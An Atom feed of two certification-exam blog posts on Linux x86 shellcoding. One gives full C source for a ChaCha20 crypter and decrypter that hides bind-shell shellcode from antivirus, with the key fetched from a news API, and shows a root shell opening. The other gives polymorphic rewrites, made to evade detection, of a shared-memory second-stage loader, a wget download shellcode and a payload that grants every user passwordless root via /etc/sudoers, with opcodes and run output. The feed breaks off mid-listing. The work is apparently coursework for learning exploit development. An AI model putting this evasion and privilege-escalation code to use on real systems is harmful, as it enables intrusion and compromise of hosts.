<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Slae | tcunha.github.io]]></title>
  <link href="http://tcunha.github.io/blog/categories/slae/atom.xml" rel="self"/>
  <link href="http://tcunha.github.io/"/>
  <updated>2018-08-22T19:58:17+00:00</updated>
  <id>http://tcunha.github.io/</id>
  <author>
    <name><![CDATA[tcunha]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[SLAE 0x07: Crypter]]></title>
    <link href="http://tcunha.github.io/blog/2018/08/21/slae-0x07-crypter/"/>
    <updated>2018-08-21T00:50:25+00:00</updated>
    <id>http://tcunha.github.io/blog/2018/08/21/slae-0x07-crypter</id>
    <content type="html"><![CDATA[<pre><code>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert

Student-ID: SLAE-1154
</code></pre>

<p>This final exercise consists in using a custom crypter and decrypter to evade anti-virus engines, since signatures are used most of the time.</p>

<p>They are both taking advantage of the <a href="https://wiki.openssl.org/index.php/EVP">EVP</a> functions provided by OpenSSL. The chosen algorithm was the <a href="https://cr.yp.to/chacha.html">ChaCha20</a> stream cipher with a random IV (12 bytes) and a key (32 bytes) retrieved on run-time. The key is the SHA256 of the <strong>id</strong> of the latest news of a <strong>configured</strong> section by using the public API provided by The Guardian.</p>

<pre><code class="c crypter">#include &lt;openssl/conf.h&gt;
#include &lt;openssl/err.h&gt;
#include &lt;openssl/evp.h&gt;
#include &lt;openssl/rand.h&gt;

#include &lt;err.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

#include "common.h"

unsigned char shellcode[] = STR(SHELLCODE);

int
main(void)
{
    EVP_CIPHER_CTX  *ctx;
    unsigned char    b[BUFSIZ];     /* Crypted buffer (should be enough). */
    unsigned char    iv[12];        /* The IV length is 96 bits. */
    unsigned char    key[32];       /* The key length is 256 bits. */
    unsigned char   *ptr = b;
    int              bl, ol;

    common_key(key);                                /* Get dynamic key. */

    if (RAND_bytes(iv, sizeof iv) == 0)             /* Get a random IV. */
        CRYPTER_SSLERR();
    if ((ctx = EVP_CIPHER_CTX_new()) == NULL)
        CRYPTER_SSLERR();
    if (EVP_EncryptInit_ex(ctx, EVP_chacha20(), NULL, key, iv) == 0)
        CRYPTER_SSLERR();
    if (EVP_EncryptUpdate(
        ctx, b, &amp;bl, shellcode, strlen((char *) shellcode)) == 0)
        CRYPTER_SSLERR();
    if (EVP_EncryptFinal_ex(ctx, b + bl, &amp;ol) == 0)
        CRYPTER_SSLERR();

    /* Check for NUL bytes in the crypted shellcode. */
    while (ptr != b + bl + ol) {    /* Final buffer size is bl plus ol. */
        if (*ptr == 0)
            errx(1, "NUL byte found!"); /* There might be more! */
        ptr++;
    }

    for (ptr = key; ptr != key + sizeof key; ptr++)
        printf("\\x%02x", *ptr);
    puts("");

    /* Print the shellcode prefixed with the randomly generated IV. */
    for (ptr = iv; ptr != iv + sizeof iv; ptr++)
        printf("\\x%02x", *ptr);
    for (ptr = b; ptr != b + bl + ol; ptr++)
        printf("\\x%02x", *ptr);
    puts("");

    return (0);
}
</code></pre>

<p>The common key retrieval code depends on cURL. Installing the header and library files, like with OpenSSL, is also needed:</p>

<pre><code class="c key retrieval">#include &lt;curl/curl.h&gt;

#include &lt;openssl/sha.h&gt;

#include &lt;err.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

#define COMMON_APIKEY           "decfe466-4db7-4a7c-b0b8-f067cceaf94d"
#define COMMON_BASE             "https://content.guardianapis.com"
#define COMMON_ENDPOINT         "/search"
#define COMMON_ENDPOINT_ARGS    "?section=science&amp;page-size=1&amp;api-key="
#define COMMON_URL              \
    COMMON_BASE                 \
    COMMON_ENDPOINT             \
    COMMON_ENDPOINT_ARGS        \
    COMMON_APIKEY

size_t
common_write(char *ptr, size_t size, size_t nmemb, void *userdata)
{
    char    *buf = (char *) userdata;

    strncpy(buf, ptr, BUFSIZ - 1);
    buf[BUFSIZ - 1] = '\0';         /* Guarantee a NUL. */

    return (nmemb * size);          /* Size is always 1; no overflow. */
}

void
common_key(unsigned char *key)
{
    CURL            *curl;
    char            *end;
    const char      *start;
    char             r[BUFSIZ];     /* Response (should be enough). */

    if (curl_global_init(CURL_GLOBAL_ALL) != 0)
        errx(1, "curl_global_init");
    if ((curl = curl_easy_init()) == NULL)
        errx(1, "curl_easy_init");
    if (curl_easy_setopt(curl, CURLOPT_URL, COMMON_URL) != 0)
        errx(1, "curl_easy_setopt");
    if (curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, common_write) != 0)
        errx(1, "curl_easy_perform");
    if (curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *) &amp;r) != 0)
        errx(1, "curl_easy_perform");
    if (curl_easy_perform(curl) != 0)
        errx(1, "curl_easy_perform");

    /* Generate a key by finding the id and performing a SHA256 over it. */
    if ((start = strstr(r, "id")) == NULL)
        errx(1, "start not found");
    start += 5;                             /* Go over the attribute. */

    if ((end = strchr(start, '"')) == NULL)
        errx(1, "end not found");
    *end = '\0';                            /* Turn it into a NUL byte. */

    /* The key needs to be 32 bytes. */
    printf("Generating key from: %s\n", start);
    SHA256((unsigned char *) start, strlen(start), key);
}
</code></pre>

<pre><code class="c decrypter">#include &lt;openssl/conf.h&gt;
#include &lt;openssl/err.h&gt;
#include &lt;openssl/evp.h&gt;

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

#include "common.h"

unsigned char shellcode[] = STR(SHELLCODE);

int
main(void)
{
    EVP_CIPHER_CTX  *ctx;
    unsigned char    b[BUFSIZ];
    unsigned char    iv[12];        /* The IV length is 96 bits. */
    unsigned char    key[32];       /* The key length is 256 bits. */
    unsigned char   *ptr = shellcode + 12;
    int              bl, ol;

    common_key(key);                        /* Get dynamic key. */
    memcpy(iv, shellcode, sizeof iv);       /* Save the prefixed IV. */

    if ((ctx = EVP_CIPHER_CTX_new()) == NULL)
        CRYPTER_SSLERR();
    if (EVP_DecryptInit_ex(ctx, EVP_chacha20(), NULL, key, iv) == 0)
        CRYPTER_SSLERR();
    if (EVP_DecryptUpdate(
        ctx, b, &amp;bl, ptr, strlen((char *) shellcode) - sizeof iv) == 0)
        CRYPTER_SSLERR();
    if (EVP_DecryptFinal_ex(ctx, b + bl, &amp;ol) == 0)
        CRYPTER_SSLERR();

    (*(void(*)(void)) b)();         /* Execute decrypted shellcode. */
    return (0);                     /* NOTREACHED */
}
</code></pre>

<p>Executing the crypter yields the following output. Like with the previous exercises, the shellcode to execute can be tweaked by the <strong>SHELLCODE</strong> variable:</p>

<pre><code class="bash">$ make crypter SHELLCODE=../0x01-bind/bind
Generating key from: science/2018/aug/21/use-of-killer-robots-in-wars-would-breach-law-say-campaigners
\xeb\x97\x33\xb0\xf6\x5a\x73\x32\x31\x34\xc8\x00\x63\x34\x98\x8e\x47\x2d\xdc\x6f\xc4\x1f\x83\x81\xf9\x04\x1b\xc9\x96\x86\x6f\xe2
\xcb\x1a\x5c\x61\x70\x5e\x82\x09\x59\x4f\xe6\x42\x1a\x62\xb9\xa6\x43\x09\xdf\x99\x33\x22\xf4\xfa\x41\xa5\x27\x6a\xe7\xfc\x76\x6a\x86\x5e\xa2\x8b\xf3\x3f\x5c\x90\xe9\xeb\x38\x4a\x0f\x30\xdb\x20\x4a\x8f\xcd\x8a\xa2\x53\xaf\xc4\x03\x1b\xe8\xf5\x9e\xe4\xed\xa6\x43\xc5\x92\xdd\xb9\x20\x0d\x1a\xb0\x95\xe7\x33\xd0\x44\x1b\x05\x47\x1c\x59\x3f\x99\xe1\xd2\x74\x62\x6d\x2b\x85\x55\xe2
</code></pre>

<p>The <strong>decrypter</strong> target already takes care of executing the crypter with the specified shellcode and extracting it from the above output:</p>

<pre><code class="bash">$ make decrypter
cc -W -Wall -Wformat=2 -fno-stack-protector -zexecstack -ggdb -DSHELLCODE=`./crypter|tail -n1`  -c -o decrypter.o decrypter.c
cc -lcrypto -lcurl -zexecstack  decrypter.o common.o   -o decrypter
# ./decrypter
Generating key from: science/2018/aug/21/use-of-killer-robots-in-wars-would-breach-law-say-campaigners
$ ss -nlt|grep 4242
LISTEN     0      0                                                         *:4242                                                                  *:*
$ nc 127.0.0.1 4242
id
uid=0(root) gid=0(root) groups=0(root)
</code></pre>

<p>Printing the contents of the decrypted buffer shows that the shellcode payload was correctly decrypted and is not gibberish unlike the original provided one:</p>

<pre><code class="bash">(gdb) b 36
Breakpoint 1 at 0xb22: file decrypter.c, line 36.
(gdb) r
Starting program: /attic/slae/exam/0x07-crypter/decrypter
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/i386-linux-gnu/libthread_db.so.1".
[New Thread 0xb7a9bb40 (LWP 1008)]
[Thread 0xb7a9bb40 (LWP 1008) exited]
Generating key from: science/2018/aug/21/use-of-killer-robots-in-wars-would-breach-law-say-campaigners

Thread 1 "decrypter" hit Breakpoint 1, main () at decrypter.c:36
36              (*(void(*)(void)) b)();         /* Execute decrypted shellcode. */
(gdb) x/10i b
   0xbfffd648:  xor    eax,eax
   0xbfffd64a:  xor    esi,esi
   0xbfffd64c:  cdq
   0xbfffd64d:  mov    ax,0x167
   0xbfffd651:  push   0x2
   0xbfffd653:  pop    ebx
   0xbfffd654:  push   0x1
   0xbfffd656:  pop    ecx
   0xbfffd657:  int    0x80
   0xbfffd659:  xchg   ebx,eax
(gdb) x/10i ptr
   0x40308c &lt;shellcode+12&gt;:     sti
   0x40308d &lt;shellcode+13&gt;:     outs   dx,BYTE PTR ds:[esi]
   0x40308e &lt;shellcode+14&gt;:     sar    dh,0xcc
   0x403091 &lt;shellcode+17&gt;:     and    cl,BYTE PTR [edi+eiz*8+0x36aa830f]
   0x403098 &lt;shellcode+24&gt;:     outs   dx,BYTE PTR ds:[esi]
   0x403099 &lt;shellcode+25&gt;:     fmul   QWORD PTR [edx-0x6c]
   0x40309c &lt;shellcode+28&gt;:     cmp    al,0xb5
   0x40309e &lt;shellcode+30&gt;:     xchg   BYTE PTR [eax-0x58bfcbc1],dh
   0x4030a4 &lt;shellcode+36&gt;:     or     ah,dl
   0x4030a6 &lt;shellcode+38&gt;:     sub    ecx,esi
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SLAE 0x06: Polymorphic Shellcodes]]></title>
    <link href="http://tcunha.github.io/blog/2018/07/28/slae-0x06-polymorphic-shellcodes/"/>
    <updated>2018-07-28T08:20:29+00:00</updated>
    <id>http://tcunha.github.io/blog/2018/07/28/slae-0x06-polymorphic-shellcodes</id>
    <content type="html"><![CDATA[<pre><code>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert

Student-ID: SLAE-1154
</code></pre>

<p>The sixth exercise consisted of choosing 3 linux/x86 shellcodes from <a href="http://shell-storm.org/shellcode/">shell-storm.org</a> and polymorphically alter them. The resulting shellcode should have at the most 150% the size of the original one.</p>

<p>This technique is useful for bypassing anti-virus engines where common operations are fingerprinted and blacklisted. By modifying a shellcode with semantically equivalent instructions, the shellcode will be harder to detect.</p>

<h3>1. Shared memory exec (369)</h3>

<p><a href="http://shell-storm.org/shellcode/files/shellcode-369.php">This</a> shellcode consists of attaching to a shared memory region and executing the in memory shellcode. It&rsquo;s initial size is <strong>50 bytes</strong>, therefore its polymorphic code must be <strong>75 bytes</strong> maximum, according to the requirements.</p>

<pre><code class="asm">global _start

section .text
_start:
    xor edi, edi
    xor esi, esi
    xor edx, edx

    mov ecx, 0xdeadbeef     ; key
    xor ebx, ebx
    mov bl, 0x17            ; shmget
    ; edx is already zero from the above
    ; esi is already zero frm the above
    xor eax, eax
    mov al, 0x75
    ; int ipc(unsigned int, int, int, int, void *, long)
    int 0x80

    xor edi, edi
    mov esi, 0xbffffffa     ; address
    xor edx, edx
    mov ecx, eax            ; move shm id returned by the shmget above
    xor ebx, ebx
    mov bl, 0x15            ; shmat
    xor eax, eax
    mov al, 0x75
    ; int ipc(unsigned int, int, int, int, void *, long)
    int 0x80

    ; push logical address to the stack and jump to it after the ret
    mov eax, 0xbffffffa
    push dword [eax]
    ret
</code></pre>

<p>The above original shellcode will obtain the identifier associated with the provided shared memory key, attach to it and jump to the in memory executable code, if any.</p>

<p>This is using the <a href="http://man7.org/linux/man-pages/man2/ipc.2.html">ipc(2)</a> system call, where like <a href="http://man7.org/linux/man-pages/man2/socketcall.2.html">socketcall(2)</a>, its first argument is the IPC function to invoke. However, unlike the socket system calls which are now exported on x86, the IPC ones aren&rsquo;t.</p>

<p>Its <a href="https://github.com/torvalds/linux/blob/716a685fdb89942a50c4138141027e38336a895f/ipc/syscall.c#L81">fourth parameter</a> (third in the prototype) is a user-provided logical address pointer where the contents of the shared memory can be accessed.</p>

<pre><code class="c ipc(2) prototype">int ipc(unsigned int call, int first, int second, int third, void *ptr, long fifth);
</code></pre>

<pre><code class="bash retrieving the system call number and constants">$ asm-syscall ipc
#define __NR_ipc 117
0x75
$ grep SHM /usr/include/linux/ipc.h
#define SHMAT           21
#define SHMDT           22
#define SHMGET          23
#define SHMCTL          24
</code></pre>

<p>The registers for the two <a href="http://man7.org/linux/man-pages/man2/ipc.2.html">ipc(2)</a> system calls will, then, have the following respective values:</p>

<pre><code>+----------+---------------+
| register |     value     |
+----------+---------------+
| eax      | 117           |
| ebx      | 23            | &lt;== shmget(2)
| ecx      | 0xdeafbeef    |
| edx      | 0             | &lt;== size is specified by the creator
| esi      | 0             | &lt;== so are the flags
| edi      | 0             |
| ebp      | 0             |
+----------+---------------+
| return   | id            |
+----------+---------------+

+----------+---------------+
| register |     value     |
+----------+---------------+
| eax      | 117           |
| ebx      | 21            | &lt;== shmat(2)
| ecx      | shmget(2) id  |
| edx      | 0             | &lt;== flags
| esi      | address       |
| edi      | 0             |
| ebp      | 0             |
+----------+---------------+
</code></pre>

<p>Initially, couldn&rsquo;t get it to work due to the hard-coded shared memory logical address. Substituting it with the current logical address of the stack allows to correctly read the contents off the shared memory.</p>

<p>The below polymorphic shellcode also gets the shared memory key by negating its initial value and performing logic and mathematical operations on the registers and is 11 bytes smaller than the original:</p>

<pre><code class="asm">global _start

section .text
_start:
    xor eax, eax
    cdq                     ; make edx zero, as well

    ; ipc(2) has a bunch of parameters, zero them all
    lea ebx, [eax]
    and esi, ebx
    sub edi, edi
    xor ebp, ebp

    mov ecx, 0x35014542     ; key in two's complement
    neg ecx                 ; key
    add bl, 0x17            ; shmget (ebx is already zero)
    ; edx, esi and ebp are already zero from the above
    or al, 0x75             ; eax is already zero
    ; int ipc(unsigned int, int, int, int, void *, long)
    int 0x80

    mov esi, esp            ; use stack logical address
    mov ecx, eax            ; move shm id returned by the shmget above
    dec ebx
    dec ebx                 ; shmat (0x2 less than shmget)
    ; edx, esi and ebp are already zero from the above
    and eax, ebp            ; make it zero
    add al, 0x75
    ; int ipc(unsigned int, int, int, int, void *, long)
    int 0x80

    jmp [esi]               ; finally jump to the second stage shellcode
</code></pre>

<p>Just like with the egghunter exercise, a custom second stage shellcode can be specified via the <strong>STAGE2</strong> variable, which will be copied to the shared memory region:</p>

<pre><code class="bash">$ make PROG=369 STAGE2=../0x01-bind/bind
nasm  -f elf32 -o 369.o 369.asm
ld -N -zexecstack -o 369 369.o
08048080 &lt;_start&gt;:
 8048080:       31 c0                   xor    eax,eax
 8048082:       99                      cdq
 8048083:       8d 18                   lea    ebx,[eax]
 8048085:       21 de                   and    esi,ebx
 8048087:       29 ff                   sub    edi,edi
 8048089:       31 ed                   xor    ebp,ebp
 804808b:       b9 42 45 01 35          mov    ecx,0x35014542
 8048090:       f7 d9                   neg    ecx
 8048092:       80 c3 17                add    bl,0x17
 8048095:       0c 75                   or     al,0x75
 8048097:       cd 80                   int    0x80
 8048099:       89 e6                   mov    esi,esp
 804809b:       89 c1                   mov    ecx,eax
 804809d:       4b                      dec    ebx
 804809e:       4b                      dec    ebx
 804809f:       21 e8                   and    eax,ebp
 80480a1:       04 75                   add    al,0x75
 80480a3:       cd 80                   int    0x80
 80480a5:       ff 26                   jmp    DWORD PTR [esi]
Shellcode size: 39
\x31\xc0\x99\x8d\x18\x21\xde\x29\xff\x31\xed\xb9\x42\x45\x01\x35\xf7\xd9\x80\xc3\x17\x0c\x75\xcd\x80\x89\xe6\x89\xc1\x4b\x4b\x21\xe8\x04\x75\xcd\x80\xff\x26
cc -DSHELLCODE=`asm-opcodes 369` -DSTAGE2=`asm-opcodes ../0x01-bind/bind` -W -Wall -fno-stack-protector -zexecstack -o shellcode 369.c
</code></pre>

<pre><code class="c">#include &lt;sys/shm.h&gt;

#include &lt;err.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

#define QUOTE(s)        #s
#define SHM_SIZE        512
#define STR(s)          QUOTE(s)

unsigned char shellcode[] = STR(SHELLCODE);
unsigned char stage2[] = STR(STAGE2);

int
main(void)
{
    int      shmid;
    void    *addr;

    if ((shmid = shmget(0xcafebabe, SHM_SIZE, 0644|IPC_CREAT)) == -1)
        err(1, "shmget");
    if ((addr = shmat(shmid, NULL, 0)) == (void *) -1)
        err(1, "shmat");
    memcpy(addr, stage2, SHM_SIZE);

    printf("Shellcode length: %zu\n", sizeof shellcode - 1);
    (*(void(*)(void)) shellcode)();

    return (0);
}
</code></pre>

<p>Breaking just before the jmp call, the contents of the second stage shellcode are correctly referenced:</p>

<pre><code class="bash">(gdb) b *0x00402085
Breakpoint 2 at 0x402085
(gdb) continue
Continuing.
Dump of assembler code for function shellcode:
   0x00402060 &lt;+0&gt;:     xor    eax,eax
   0x00402062 &lt;+2&gt;:     cdq
   0x00402063 &lt;+3&gt;:     lea    ebx,[eax]
   0x00402065 &lt;+5&gt;:     and    esi,ebx
   0x00402067 &lt;+7&gt;:     sub    edi,edi
   0x00402069 &lt;+9&gt;:     xor    ebp,ebp
   0x0040206b &lt;+11&gt;:    mov    ecx,0x35014542
   0x00402070 &lt;+16&gt;:    neg    ecx
   0x00402072 &lt;+18&gt;:    add    bl,0x17
   0x00402075 &lt;+21&gt;:    or     al,0x75
   0x00402077 &lt;+23&gt;:    int    0x80
   0x00402079 &lt;+25&gt;:    mov    esi,esp
   0x0040207b &lt;+27&gt;:    mov    ecx,eax
   0x0040207d &lt;+29&gt;:    dec    ebx
   0x0040207e &lt;+30&gt;:    dec    ebx
   0x0040207f &lt;+31&gt;:    and    eax,ebp
   0x00402081 &lt;+33&gt;:    add    al,0x75
   0x00402083 &lt;+35&gt;:    int    0x80
=&gt; 0x00402085 &lt;+37&gt;:    jmp    DWORD PTR [esi]
   0x00402087 &lt;+39&gt;:    add    BYTE PTR [eax],al
End of assembler dump.
$2 = [ IF ]

Breakpoint 2, 0x00402085 in shellcode ()
(gdb) i r esi
esi            0xbffff62c       -1073744340
(gdb) x/10i *$esi
   0xb7fd2000:  xor    eax,eax
   0xb7fd2002:  xor    esi,esi
   0xb7fd2004:  cdq
   0xb7fd2005:  mov    ax,0x167
   0xb7fd2009:  push   0x2
   0xb7fd200b:  pop    ebx
   0xb7fd200c:  push   0x1
   0xb7fd200e:  pop    ecx
   0xb7fd200f:  int    0x80
   0xb7fd2011:  xchg   ebx,eax
</code></pre>

<pre><code class="bash"># ./shellcode
Shellcode length: 39
Second stage length: 82
$ ss -nlt|grep 4242
LISTEN     0      0            *:4242                     *:*
$ nc -v 127.0.0.1 4242
Connection to 127.0.0.1 4242 port [tcp/*] succeeded!
id
uid=0(root) gid=0(root) groups=0(root)
</code></pre>

<h3>2. Remote file download (611)</h3>

<p>The objective of <a href="http://shell-storm.org/shellcode/files/shellcode-611.php">this</a> one consists in calling /usr/bin/wget via <a href="http://man7.org/linux/man-pages/man2/execve.2.html">execve(2)</a> and fetch the remote <strong>aaaa</strong> resource. It&rsquo;s size is <strong>42 bytes</strong>, meaning that its morphed code must be at the most <strong>63 bytes</strong>.</p>

<pre><code class="asm">global _start

section .text
_start:
    push byte +0xb
    pop eax
    ; int execve(const char *, char *const [], char *const [])
    cdq                     ; set edx to zero, as well

    push edx                ; push the terminating nul byte
    push dword 0x61616161   ; aaaa
    mov ecx, esp            ; save address of arguments
    push edx                ; push the terminating nul byte
    push byte +0x74         ; t
    push dword 0x6567772f   ; /wge
    push dword 0x6e69622f   ; /bin
    push dword 0x7273752f   ; /usr
    mov ebx, esp            ; filename
    push edx                ; push the terminating nul byte
    push ecx                ; push the address of the arguments
    push ebx                ; push the address of the filename
    mov ecx, esp            ; argv
    ; edx is already zero from the above cdq instruction
    int 0x80

    inc eax
    int 0x80
</code></pre>

<p>Trying to execute it does, indeed, fetch the remote resource. In the modified shellcode I&rsquo;ve opted to remove the last two instructions, since if the <a href="http://man7.org/linux/man-pages/man2/execve.2.html">execve(2)</a> system call fails -1 is returned, thus incrementing eax would make the code call <a href="http://man7.org/linux/man-pages/man2/restart_syscall.2.html">restart_syscall(2)</a>.</p>

<pre><code class="bash">$ ./611
--2018-08-08 22:00:10--  http://aaaa/
Resolving aaaa (aaaa)... failed: Name or service not known.
wget: unable to resolve host address 'aaaa'
</code></pre>

<p>To save space, pointer arithmetic operations on stack values are performed with the ebp register, instead of with esp. The offsets are, also, statically calculated by the code. The resulting morphed shellcode is 21 bytes bigger, making it the maximum 63 bytes allowed by the requirements:</p>

<pre><code class="asm">global _start

section .text
_start:
    push 0xffffffff
    pop eax
    neg eax
    add al, 0xa                     ; make it 0xb
    ; int execve(const char *, char *const [], char *const [])
    cdq                             ; make edx zero, as well

    ; make the base pointer the same as the current stack pointer, since
    ; operations with pointers are one byte smaller with the former
    mov ebp, esp

    push edx                        ; nul character
    push 0x61616161                 ; fetch this resource

    push edx                        ; nul character
    push edx                        ; the stack might be full of garbage
    mov byte [ebp - 0x10], 0x74     ; overwrite LSB with a t
    ; no need to sub the stack pointer here, only the current double word
    ; LSB was changed

    push 0xcaceee5e
    ror dword [esp], 0x1            ; /wge
    push 0xdcd2c45e
    ror dword [esp], 0x1            ; /bin
    push 0xe4e6ea5e
    ror dword [esp], 0x1            ; /usr

    push esp
    pop ebx                         ; filename
    lea ecx, [ebp - 0x8]            ; save a pointer to the arguments

    push edx
    mov dword [ebp - 0x24], ecx     ; save the pointer to the arguments
    mov dword [ebp - 0x28], ebx     ; save the pointer to the command
    lea ecx, [ebp - 0x28]           ; argv

    ; edx is already zero by the above cdq instruction
    int 0x80
</code></pre>

<p>The stack and registers before the <a href="http://man7.org/linux/man-pages/man2/execve.2.html">execve(2)</a> system call will have the following layout and values, as it can be seen from the gdb output:</p>

<pre><code>+------------+
|   random   | &lt;==== ebp
+------------+
| 0x00000000 | &lt;==== ebp - 0x04
+------------+
| 0x61616161 | &lt;==== ebp - 0x08 (ecx)
+------------+
| 0x00000000 | &lt;==== ebp - 0x0c
+------------+
| 0x00000074 | &lt;==== ebp - 0x10
+------------+
| 0x6567772f | &lt;==== ebp - 0x14
+------------+
| 0x6e69622f | &lt;==== ebp - 0x18
+------------+
| 0x7273752f | &lt;==== ebp - 0x1c (ebx)
+------------+
| 0x00000000 | &lt;==== ebp - 0x20
+------------+
|  ecx  ptr  | &lt;==== ebp - 0x24
+------------+
|  ebx  ptr  | &lt;==== ebp - 0x28 (ecx)
+------------+
</code></pre>

<pre><code>(gdb) b *0x0040207d
Breakpoint 2 at 0x40207d
(gdb) continue
Continuing.
Dump of assembler code for function shellcode:
   0x00402040 &lt;+0&gt;:     push   0xffffffff
   0x00402042 &lt;+2&gt;:     pop    eax
   0x00402043 &lt;+3&gt;:     neg    eax
   0x00402045 &lt;+5&gt;:     add    al,0xa
   0x00402047 &lt;+7&gt;:     cdq
   0x00402048 &lt;+8&gt;:     mov    ebp,esp
   0x0040204a &lt;+10&gt;:    push   edx
   0x0040204b &lt;+11&gt;:    push   0x61616161
   0x00402050 &lt;+16&gt;:    push   edx
   0x00402051 &lt;+17&gt;:    push   edx
   0x00402052 &lt;+18&gt;:    mov    BYTE PTR [ebp-0x10],0x74
   0x00402056 &lt;+22&gt;:    push   0xcaceee5e
   0x0040205b &lt;+27&gt;:    ror    DWORD PTR [esp],1
   0x0040205e &lt;+30&gt;:    push   0xdcd2c45e
   0x00402063 &lt;+35&gt;:    ror    DWORD PTR [esp],1
   0x00402066 &lt;+38&gt;:    push   0xe4e6ea5e
   0x0040206b &lt;+43&gt;:    ror    DWORD PTR [esp],1
   0x0040206e &lt;+46&gt;:    push   esp
   0x0040206f &lt;+47&gt;:    pop    ebx
   0x00402070 &lt;+48&gt;:    lea    ecx,[ebp-0x8]
   0x00402073 &lt;+51&gt;:    push   edx
   0x00402074 &lt;+52&gt;:    mov    DWORD PTR [ebp-0x24],ecx
   0x00402077 &lt;+55&gt;:    mov    DWORD PTR [ebp-0x28],ebx
   0x0040207a &lt;+58&gt;:    lea    ecx,[ebp-0x28]
=&gt; 0x0040207d &lt;+61&gt;:    int    0x80
   0x0040207f &lt;+63&gt;:    add    BYTE PTR [eax],al
End of assembler dump.
$50 = [ IF OF ]
0x0040207d in shellcode ()
(gdb) x/10w $esp - 8
0xbffff624:     0xbffff630      0xbffff644      0x00000000      0x7273752f
0xbffff634:     0x6e69622f      0x6567772f      0x00000074      0x00000000
0xbffff644:     0x61616161      0x00000000
(gdb) x/s 0xbffff630
0xbffff630:     "/usr/bin/wget"
(gdb) x/s 0xbffff644
0xbffff644:     "aaaa"
</code></pre>

<pre><code class="bash">$ make PROG=611
nasm  -f elf32 -o 611.o 611.asm
ld -N -zexecstack -o 611 611.o
08048080 &lt;_start&gt;:
 8048080:       6a ff                   push   0xffffffff
 8048082:       58                      pop    eax
 8048083:       f7 d8                   neg    eax
 8048085:       04 0a                   add    al,0xa
 8048087:       99                      cdq
 8048088:       89 e5                   mov    ebp,esp
 804808a:       52                      push   edx
 804808b:       68 61 61 61 61          push   0x61616161
 8048090:       52                      push   edx
 8048091:       52                      push   edx
 8048092:       c6 45 f0 74             mov    BYTE PTR [ebp-0x10],0x74
 8048096:       68 5e ee ce ca          push   0xcaceee5e
 804809b:       d1 0c 24                ror    DWORD PTR [esp],1
 804809e:       68 5e c4 d2 dc          push   0xdcd2c45e
 80480a3:       d1 0c 24                ror    DWORD PTR [esp],1
 80480a6:       68 5e ea e6 e4          push   0xe4e6ea5e
 80480ab:       d1 0c 24                ror    DWORD PTR [esp],1
 80480ae:       54                      push   esp
 80480af:       5b                      pop    ebx
 80480b0:       8d 4d f8                lea    ecx,[ebp-0x8]
 80480b3:       52                      push   edx
 80480b4:       89 4d dc                mov    DWORD PTR [ebp-0x24],ecx
 80480b7:       89 5d d8                mov    DWORD PTR [ebp-0x28],ebx
 80480ba:       8d 4d d8                lea    ecx,[ebp-0x28]
 80480bd:       cd 80                   int    0x80
Shellcode size: 63
\x6a\xff\x58\xf7\xd8\x04\x0a\x99\x89\xe5\x52\x68\x61\x61\x61\x61\x52\x52\xc6\x45\xf0\x74\x68\x5e\xee\xce\xca\xd1\x0c\x24\x68\x5e\xc4\xd2\xdc\xd1\x0c\x24\x68\x5e\xea\xe6\xe4\xd1\x0c\x24\x54\x5b\x8d\x4d\xf8\x52\x89\x4d\xdc\x89\x5d\xd8\x8d\x4d\xd8\xcd\x80
cc -DSHELLCODE=`asm-opcodes 611` -W -Wall -fno-stack-protector -zexecstack -o shellcode ../skel.c
</code></pre>

<pre><code class="bash">$ ./shellcode
Shellcode length: 63
--2018-08-08 23:02:04--  http://aaaa/
Resolving aaaa (aaaa)... failed: Name or service not known.
wget: unable to resolve host address 'aaaa'
</code></pre>

<h3>3. Edit /etc/sudoers for full access (62)</h3>

<p>The final <a href="http://shell-storm.org/shellcode/files/shellcode-62.php">one</a> grants root access to every single user on the machine. It&rsquo;s size is <strong>86 bytes</strong>, meaning that the altered shellcode should be at the most <strong>129 bytes</strong>.</p>

<pre><code class="asm">global _start

section .text:
_start:
    xor eax, eax
    push eax                        ; nul character
    push dword 0x7372656f           ; oers
    push dword 0x6475732f           ; /sud
    push dword 0x6374652f           ; /etc
    mov ebx, esp                    ; pathname
    mov cx, 0x401                   ; flags (O_WRONLY | O_APPEND)
    mov al, 0x5
    ; int open(const char *, int)
    int 0x80

    mov ebx, eax                    ; move new file descriptor
    xor eax, eax
    push eax                        ; nul character
    push dword 0xa4c4c41            ; ALL
    push dword 0x203a4457           ; WD:
    push dword 0x53534150           ; PASS
    push dword 0x4f4e2029           ; ) NO
    push dword 0x4c4c4128           ; (ALL
    push dword 0x3d4c4c41           ; ALL=
    push dword 0x204c4c41           ; ALL
    mov ecx, esp                    ; buf
    mov dl, 0x1c                    ; count
    mov al, 0x4
    ; ssize_t write(int, const void *, size_t)
    int 0x80

    mov al, 0x6
    ; int close(int)
    int 0x80

    xor ebx,ebx
    mov al, 0x1
    ; int exit(int)
    int 0x80
</code></pre>

<p>Decided to drop the <a href="http://man7.org/linux/man-pages/man2/close.2.html">close(2)</a> and <a href="http://man7.org/linux/man-pages/man3/exit.3.html">exit(2)</a> system calls since they don&rsquo;t bring any advantages whatsoever and moreover, prunning them allowed to focus more on MMX, FPU and SSE instructions. The total size of the morphed code is 128 bytes:</p>

<pre><code class="asm">global _start

section .text
_start:
    push esp
    ; make the base pointer the same as the current stack pointer, since
    ; operations with pointers are one byte smaller with the former
    pop ebp

    xor eax, eax
    cdq                             ; make edx zero, too

    push 0xcafebabe                 ; initial xor value
    push edx                        ; nul character
    push 0xb98cdfd1
    push 0x17071640
    movd mm0, [ebp - 0x4]           ; load initial xor value
    pxor mm0, [ebp - 0xc]           ; oers
    movd [ebp - 0xc], mm0           ; overwrite result on the stack
